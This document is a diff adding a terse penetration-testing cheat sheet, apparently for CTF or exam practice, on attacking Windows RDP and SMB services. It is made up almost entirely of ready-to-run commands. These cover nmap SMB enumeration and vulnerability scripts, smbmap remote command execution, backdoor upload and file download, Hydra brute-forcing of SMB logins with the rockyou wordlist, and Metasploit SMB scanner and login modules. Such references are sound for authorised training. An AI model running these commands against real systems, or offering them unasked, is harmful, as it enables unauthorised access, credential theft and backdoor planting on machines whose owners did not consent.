@@ -1,0 +1,60 @@
+RDP Connect to RDP port 
+xfreerdp /v:<Target_IP> /u:Administrator
+Find suspicious account? You've a credential of one user, you can use RDP to log in e found suspicious account (port 3389).
+Opening cmd and use:
+net user command.
+
+Netbios If you get any questions related to netbios, SMB use metasploit. 
+SMB 
+Nmap
+sudo nmap -p 445 -sV -sC -O <TARGET_IP> 
+nmap -sU --top-ports 25 --open <TARGET_IP> 
+nmap -p 445 --script smb-protocols <TARGET_IP> 
+nmap -p 445 --script smb-security-mode <TARGET_IP> 
+nmap -p 445 --script smb-enum-sessions <TARGET_IP> 
+nmap -p 445 --script smb-enum-sessions --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP> 
+nmap -p 445 --script smb-enum-shares <TARGET_IP> 
+nmap -p 445 --script smb-enum-shares --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP> 
+nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
+nmap -p 445 --script smb-server-stats --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP> 
+nmap -p 445 --script smb-enum-domains--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP> 
+nmap -p 445 --script smb-enum-groups--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP> 
+nmap -p 445 --script smb-enum-services --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP> 
+nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP> 
+nmap -p 445 --script smb-os-discovery <TARGET_IP> 
+nmap -p445 --script=smb-vuln-* <TARGET_IP> 
+
+SMBMap 
+smbmap -u guest -p "" -d . -H <TARGET_IP>
+smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP> 
+## Run a command 
+smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -x 'ipconfig' 
+## List all drives 
+smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -L 
+## List dir content 
+smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -r 'C$' 
+## Upload a file 
+smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/sample_backdoor' 'C$\sample_backdoor'
+## Download a file 
+smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
+
+SMB - Hydra 
+hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb 
+
+SMB - Metasploit 
+# METASPLOIT Starting 
+msfconsole 
+msfconsole -q 
+
+# METASPLOIT SMB 
+use auxiliary/scanner/smb/smb_version 
+use auxiliary/scanner/smb/smb_enumusers 
+use auxiliary/scanner/smb/smb_enumshares 
+use auxiliary/scanner/smb/smb_login 
+use auxiliary/scanner/smb/pipe_auditor 
+
+## set options depends on the selected module 
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt 
+set SMBUser <USER> 
+set RHOSTS <TARGET_IP> 
+exploit 
